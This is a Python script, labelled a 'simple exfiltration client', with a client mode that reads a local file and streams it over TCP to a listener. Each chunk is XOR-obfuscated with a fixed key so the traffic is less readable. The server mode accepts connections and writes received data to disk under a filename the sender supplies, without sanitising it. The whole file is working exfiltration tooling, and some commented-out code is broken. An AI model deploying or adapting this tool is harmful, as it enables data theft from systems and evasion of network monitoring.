#! python

"""
Python simple exfiltration client.


"""
import sys
import getopt

import socket
import binascii

host = 'localhost'
port = 10013
size = 1024
maxconn = 3

obfuscation_key = 0x13

""""
def obfuscation(key = None, data = None):

	original = data

	origByte = [ elem for elem in original ]
	print("Hex: {0}".format(origByte))
	obfuscated = []
	for byte in origByte:
		obfuscated.append(int(key) ^ byte)
	print("Obfuscated: {0}".format(obfuscated))
	#origByte = [ hex(int(elem)) for elem in obfuscated ]
	#encode = ''.join(origByte).replace('0x','\\x')
	#print("Original: {0} \nCrypted: {1} \n".format(original,obfuscated))

	return obfuscated

def deobfuscation(data = None):

	#data = data.decode("UTF-8")
	key = data[:1].decode("UTF-8")
	msg = data[1:]

	#print("Key: {0}".format(hex(ord(key))))
	#print("msg: {0}".format(msg))

	origByte = [ elem for elem in msg ]
	#print("msg: {0}".format(origByte))
	deobfuscated = ''
	for byte in origByte:
		print("dec: {0} ^ {1} = {2}".format(ord(key),byte, chr(ord(key) ^ byte)))
		deobfuscated += chr(ord(key) ^ byte)
	print("msg clear: {0}".format(bytearray(bdeobfuscated)))
	#deobfuscated = ''.join(deobfuscated)
	#print("deobfuscated: {0} \n".format(deobfuscated))

	return ord(key), deobfuscated

""" 

def xor_crypt(data, key=None, encode=False, decode=False):
	import struct

	#print("Key: {0} data: {1}".format(key,data))

	#if decode:
		#print("-- Received len : {0}".format(len(data)))
		#data = base64.decodestring(data)

	#xored = ''
	xored = bytearray()

	if key is None:
		key = ord(data[:1].decode("UTF-8"))
		#print("Arrived Key: {0}".format(key))
		data = data[1:]
	else:
		#xored += chr(key)
		xored.extend(struct.pack('B',key))


	#print("123 Key: {0} data: {1}".format(key,data))

	#xored += ''.join(chr(x ^ int(key)) for x in data)
	for x in data:
		xored.extend(struct.pack('B',(x ^ int(key))))

	#print("Key: {0} data: {1}".format(key,xored))

	#xored = xored.encode()
	#if encode:
	#	print("Create xored {0}".format(len(xored)))
		#ret = base64.encodestring(xored.encode("UTF-8")).strip()
		#print("-- Send len : {0}".format(len(ret)))
		#print("Key: {0} data: {1}".format(key,ret))
		
		#print("-- Send len : {0} and {1}".format(len(xored),xored))
	#else:
		#print("-- Receved len : {0} and {1}".format(len(xored),xored))
		#xored = ret

	return key, xored

def mk_pkt(key, data):

	#data = obfuscation(key,data)
	key, data = xor_crypt(data,key,encode=True)
	#ar = [key]
	#[ ar.append(elem) for elem in data ]
	#pkt = bytearray(ar)
	#pkt = chr(key)+data
	pkt = data
	#print("Pkt: {0} \n\n".format(pkt))
	return pkt

def rd_pkt(data):
	return xor_crypt(data,decode=True)



def client(filename=None):
	# client code

	#key = chr(int(obfuscation_key))
	key = obfuscation_key

	if filename is None:
		print("Error: file name has to be specified!")

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	s.sendall(mk_pkt(key,filename.encode("UTF-8")))
	data = s.recv(size)
	#print("Reply file: {0}".format(data.decode('UTF-8')))
	#key, data = deobfuscation(data)
	key, data = rd_pkt(data)
	if data != bytearray(b"OK"):
		return 1 

	print("Start sending {0}...".format(filename))
	nbyte = 0
	with open(filename, "rb") as fp:
		while True:
			data = fp.read(size)
			#print("Read size: {0}".format(len(data)))
			#print("Read 2222 : {0}".format(data.decode("UTF-8")))
			if data == ''.encode("UTF-8"):
				#print("End of file!")
				break #end of file
			#print("sent: {0}".format(data))
			s.sendall(mk_pkt(key, data))
			nbyte += len(data)
			data = s.recv(size)
			key, data = rd_pkt(data)
			print("ok: {0}".format(data))
			if data !=  bytearray(b"OK"):
				return 1 
			#print("sent: {0}".format(data))
	s.sendall(mk_pkt(key,bytearray(b'')))
	print("Finished...")
	print("Data sent {0}...".format(nbyte))
	s.close

def server():
	# server code
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('',port))
	s.listen(maxconn) 
	while 1:
		key = 0x00
		client, address = s.accept()
		print("Accepeted connection from: {0}".format(address))
		data = client.recv(size)
		#key, data = deobfuscation(data)
		key, data = rd_pkt(data)

		print("Start receving file: {0}".format(data))

		client.sendall(mk_pkt(key,bytearray(b'OK')))
		nbyte = 0 
		with open("received_"+data.decode(), "wb") as fp:
			while True:
				#print("Waiting...")
				data = client.recv(2000)
				#key, data = deobfuscation(data)
				key, data = rd_pkt(data)
				#print("rcv data: {0}".format(data.encode("UTF-8").decode("UTF-8")))
				if len(data) == 0:
					#print("Fine file!")
					break #end of file
				fp.write(data)
				client.sendall(mk_pkt(key,bytearray(b'OK')))
				nbyte += len(data)

		print("Transfer completed! Data received {0} \n\n".format(nbyte))
		client.close() 


def main():
    # parse command line options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "c:s", ["client","server"])
    except getopt.GetoptError as err:
        print("Error:{0}".format(str(err)))
        print("for help use --help")
        sys.exit(2)
    # process options
    for o, a in opts:
        if o in ("-c", "--client"):
            print("Client file: {0}".format(a))
            client(a)
            sys.exit(0)
        if o in ("-s", "--server"):
        	print("Server running...")
        	server()
        	sys.exit(0)


if __name__ == "__main__":
    main()